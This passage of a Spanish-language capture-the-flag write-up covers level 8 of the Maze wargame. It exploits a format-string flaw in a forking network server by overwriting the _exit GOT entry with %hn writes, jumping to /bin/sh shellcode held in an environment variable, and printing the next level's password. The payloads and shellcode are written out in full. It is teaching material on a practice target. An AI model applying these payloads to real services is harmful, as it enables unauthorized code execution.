    <span class=mtk1>replybuf[sVar4</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>d</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>;</span>
  <span class=mtk1>}</span>
  <span class=mtk1>sVar4</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(replybuf);</span>
  <span class=mtk8>send</span><span class=mtk1>(client_sock,</span> <span class=mtk1>replybuf,</span> <span class=mtk1>sVar4,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
  <span class=mtk8>_exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
<span class=mtk1>}</span>
</code></pre></div><p>Podemos iniciar el servidor en una sesión e interactuar desde otra:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ /maze/maze8  
</code></pre></div><p>Aunque la contraseña está escrita en el binario, el servidor siempre dice que está mal:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ nc 127.0.0.1 1337
Give the correct password to proceed: god
god is wrong ^_^
<span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ nc 127.0.0.1 1337
Give the correct password to proceed: asdf  
asdf is wrong ^_^
</code></pre></div><p>El programa está llamando a <code>snprintf</code> utilizando una variable controlada por el usuario (<code>buf</code>) como <em>format string</em>. Por tanto, existe una vulnerabilidad de <em>Format String</em>. Podemos comprobarlo de esta manera:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ nc 127.0.0.1 1337
Give the correct password to proceed: %x.%x.%x.%x.%x.%x.%x.%x.%x
3de00e00.30306530.3330332e.33353630.33332e30.33333033.332e6532.33353333.2e303336 is wrong ^_^  
</code></pre></div><p>Esta vulnerabilidad permite leer valores arbitrario de la memoria, pero también escribir valores arbitrarios.</p><p>En primer lugar, tenemos que descubrir la posición en la pila donde nuestra entrada se está almacenando. Esto puede realizarse poniendo algunos caracteres reconocibles antes de los formatos <code>%x</code> (formato que muestra los datos en hexadecimal):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ nc 127.0.0.1 1337
Give the correct password to proceed: AAAA %x.%x.%x.%x.%x.%x.%x
AAAA 41414141.34313420.34313431.34332e31.34333133.332e3032.33313334 is wrong ^_^  
</code></pre></div><p>Y vemos que el primer <code>%x</code> imprime <code>41414141</code> (que es <code>AAAA</code> en hexadecimal). Por tanto, lo que pongamos en los primeros 4 bytes estarán en la posición 1 de la pila. Podemos verificarlo así:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ nc 127.0.0.1 1337
Give the correct password to proceed: AAAA %1$x  
AAAA 41414141 is wrong ^_^
</code></pre></div><p>Y además, si añadimos más datos, podemos utilizar <code>%2$x</code> para tener más valores:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ nc 127.0.0.1 1337
Give the correct password to proceed: AAAABBBB %1$x %2$x  
AAAABBBB 41414141 42424242 is wrong ^_^
</code></pre></div><p>Ahora es el momento de introducir el formato <code>%n</code>. Este permite escribir el número de caracteres imprimidos hasta el formato <code>%n</code> en la dirección de la variable a la que apunta.</p><p>Por ejemplo, si pusiéramos <code>AAAA %1$n</code>, el programa guardaría <code>0x00000005</code> en la dirección <code>0x41414141</code>. Pero esto es solo un ejemplo, la idea ahora es sobrescribir una entrada de la Tabla de <em>Offsets</em> Globales para que apunte a <em>shellcode</em> malicioso.</p><p>Después de <code>snprintf</code> el programa llama a <code>strlen</code> y <code>_exit</code>. Podemos sobreescribir cualquiera de ellos, pero utilizaré <code>_exit</code> esta vez. La dirección de <code>_exit</code> en la GOT es la siguiente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ objdump -R /maze/maze8 | grep _exit  
08049d18 R_386_JUMP_SLOT   _exit@GLIBC_2.0
</code></pre></div><p>Ahora la idea es poner <code>0x08049d18</code> (en formato <em>little-endian</em>) donde teníamos las <code>AAAA</code> en el ejemplo y poner un valor en esta dirección utilizando <code>%n</code>. Para probarlo, ejecutamos el servidor con GDB. Será útil poner un <em>breakpoint</em> después de <code>snprintf</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze8
Reading symbols from /maze/maze8...done.
(gdb) source /usr/local/peda/peda.py
<span class=code-dark-red>gdb-peda$</span> disassemble main
Dump of assembler code for function main:
   0x08048795 &lt;+0&gt;:     push   ebp
   0x08048796 &lt;+1&gt;:     mov    ebp,esp
   0x08048798 &lt;+3&gt;:     sub    esp,0x440
   ...
   0x0804899d &lt;+520&gt;:   call   0x8048600 &lt;snprintf@plt&gt;  
   0x080489a2 &lt;+525&gt;:   add    esp,0xc
   0x080489a5 &lt;+528&gt;:   lea    eax,[ebp-0x440]
   0x080489ab &lt;+534&gt;:   push   eax
   0x080489ac &lt;+535&gt;:   call   0x80485c0 &lt;strlen@plt&gt;
   ...
   0x080489f9 &lt;+612&gt;:   call   0x8048670 &lt;send@plt&gt;
   0x080489fe &lt;+617&gt;:   add    esp,0x10
   0x08048a01 &lt;+620&gt;:   push   0x0
   0x08048a03 &lt;+622&gt;:   call   0x8048550 &lt;_exit@plt&gt;
   0x08048a08 &lt;+627&gt;:   push   DWORD PTR [ebp-0x14]
   0x08048a0b &lt;+630&gt;:   call   0x8048660 &lt;close@plt&gt;
   0x08048a10 &lt;+635&gt;:   add    esp,0x4
   0x08048a13 &lt;+638&gt;:   jmp    0x80488b8 &lt;main+291&gt;
End of assembler dump.
<span class=code-dark-red>gdb-peda$</span> break *0x080489a2
Breakpoint 1 at 0x80489a2: file maze8.c, line 82.
</code></pre></div><p>Como el servidor genera un proceso hijo cada vez que se recibe una conexión, tenemos que decirle a GDB que siga el proceso hijo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> set follow-fork-mode child
<span class=code-dark-red>gdb-peda$</span> run 1338
Starting program: /maze/maze8 1338
^C
Program received signal SIGINT, Interrupt.  
...
Stopped reason: <span class=code-dark-red>SIGINT</span>
0xf7fd7c99 in __kernel_vsyscall ()
<span class=code-dark-red>gdb-peda$</span> x 0x08049d18
0x8049d18:      0x08048556
<span class=code-dark-red>gdb-peda$</span> continue
Continuing.
</code></pre></div><p>Ahora podemos probar el <em>format string</em> explicado anteriormente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ echo -e '\x18\x9d\x04\x08%1$n' | nc 127.0.0.1 1338  
Give the correct password to proceed:
</code></pre></div><p>Y el servidor se para en el <em>breakpoint</em>. Ahora podemos examinar la dirección <code>0x08049d18</code> (que es la entrada de <code>_exit</code> en la GOT):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> x 0x08049d18
0x8049d18:      0x00000004  
</code></pre></div><p>Como esperábamos, hemos escrito un valor de <code>0x00000004</code> porque se han impreso 4 caracteres antes del formato <code>%n</code>.</p><p>Para conseguir escribir una dirección de la pila, necesitamos introducir un valor más grande que <code>0xfffdd000</code> (el comienzo del espacio de la pila). Por tanto, tendríamos que imprimir una cantidad enorme de caracteres (lo cual es imposible de gestionar).</p><p>La solución a esto es utilizar formatos como <code>%hn</code> y <code>%hhn</code>, que sobrescriben 2 bytes y 1 bytes, respectivamente. De momento, vamos a usar solo <code>%hn</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> run 1339
Starting program: /maze/maze8 1339  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ echo -e '\x18\x9d\x04\x08%1$hn' | nc 127.0.0.1 1339  
Give the correct password to proceed:
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> x 0x08049d18
0x8049d18:      0x08040004  
</code></pre></div><p>Genial, hemos sobrescrito los últimos 2 bytes en esta dirección con <code>0x0004</code>.</p><p>Vamos a añadir una variable de entorno con <em>shellcode</em>, como en niveles anteriores, y reiniciar GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ export TEST=$(python3 -c 'import os; os.write(1, b"\x90" * 200 + b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\xcd\x80")')  
<span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze8
Reading symbols from /maze/maze8...done.
(gdb) source /usr/local/peda/peda.py
<span class=code-dark-red>gdb-peda$</span> set follow-fork-mode child
<span class=code-dark-red>gdb-peda$</span> break *0x080489a2
Breakpoint 1 at 0x80489a2: file maze8.c, line 82.
</code></pre></div><p>Hemos puesto un montón de instrucciones <code>nop</code> (<code>"\x90"</code>) para prevenir probemas cuando explotemos el binario sin GDB.</p><p>Ahora vemos la posición de la variable de entorno <code>TEST</code> en la pila:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> start
...
<span class=code-dark-red>gdb-peda$</span> find TEST
Searching for 'TEST' in: None ranges
Found 2 results, display max 2 items:
   libc : <span class=code-dark-green>0xf7f6fd88</span> ("TEST")
[stack] : <span class=code-dark-blue>0xffffdd6e</span> ("TEST=", '\220' &lt;repeats 195 times&gt;...)  
</code></pre></div><p>Entonces, necesitamos escribir <code>0xffffdd6e</code> en la entrada de <code>_exit</code> de la GOT (<code>0x08049d18</code>). De momento, vamos a poner <code>0xdd80</code> en los últimos 2 bytes (se ha añadido un pequeño <em>offset</em> a la dirección de la variable de entorno). Para ello, necesitamos escribir <code>0xdd80 = 56704</code> caracteres, que puede hacerse con otro formato (<code>%c</code>).</p><p>Nótese que ya hay 4 bytes escritos (la dirección), por lo que un formato como <code>%56700c</code> será suficiente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> run 1340
Starting program: /maze/maze8 1340  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ echo -e '\x18\x9d\x04\x08%56700c%1$hn' | nc 127.0.0.1 1340  
Give the correct password to proceed:
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> x 0x08049d18
0x8049d18:      0x0804dd80  
</code></pre></div><p>Perfecto, ahora tenemos que cambiar los 2 primeros bytes. Para esto, tenemos que poner <code>0xffff</code> en la dirección <code>0x08049d18 + 2 = 0x08049d1a</code>. Sin embargo, ya hemos escrito <code>0xdd80</code> bytes, por lo que necesitamos <code>0xffff - 0xdd80 = 8831</code> caracteres adicionales.</p><p>Para efectuar los dos procesos de escritura a la vez, podemos usar el hecho de que los 4 primeros bytes irán a la posición 1 de la pila y los 4 bytes siguientes irán a la posición 2. Por tanto, pondremos <code>"\x18\x9d\x04\x08\x1a\x9d\x04\x08"</code> al principio (8 bytes), y tendremos que cambiar <code>%56700c</code> por <code>%56696c</code> (aunque no es estrictamente necesario ya que tenemos un montón de instrucciones <code>nop</code>). Este será el <em>payload</em> final:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> run 1341
Starting program: /maze/maze8 1341  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ echo -e '\x18\x9d\x04\x08\x1a\x9d\x04\x08%56696c%1$hn%8831c%2$hn' | nc 127.0.0.1 1341  
Give the correct password to proceed:
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> x 0x08049d18
0x8049d18:      0xffffdd80  
</code></pre></div><p>Y vemos que la entrada de <code>_exit</code> en la GOT se ha modificado por el valor deseado. Si continuamos, GDB tratará de otorgarnos una <em>shell</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> continue
Continuing.
process 1730 is executing new program: /bin/dash  
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80489a2
</code></pre></div><p>Ahora lo podemos probar sin GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ /maze/maze8  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ echo -e '\x18\x9d\x04\x08\x1a\x9d\x04\x08%56696c%1$hn%8831c%2$hn' | nc 127.0.0.1 1337
Give the correct password to proceed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       is wrong ^_^  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ export TEST=$(python3 -c 'import os; os.write(1, b"\x90" * 200 + b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\xcd\x80")')  
<span class=code-green>maze8@maze</span>:<span class=code-blue>~</span>$ /maze/maze8
$ whoami
maze9
$ cat /etc/maze_pass/maze9
jopieyahng
</code></pre></div><p>Y listo. Tenemos acceso como <code>maze9</code> y vemos un mensaje de &ldquo;<em>congratulations</em>&rdquo;:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze9@maze</span>:<span class=code-blue>~</span>$ ls  
CONGRATULATIONS
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#nivel-0---1>Nivel 0 -> 1</a></li><li><a href=#nivel-1---2>Nivel 1 -> 2</a></li><li><a href=#nivel-2---3>Nivel 2 -> 3</a></li><li><a href=#nivel-3---4>Nivel 3 -> 4</a></li><li><a href=#nivel-4---5>Nivel 4 -> 5</a></li><li><a href=#nivel-5---6>Nivel 5 -> 6</a></li><li><a href=#nivel-6---7>Nivel 6 -> 7</a></li><li><a href=#nivel-7---8>Nivel 7 -> 8</a></li><li><a href=#nivel-8---9>Nivel 8 -> 9</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>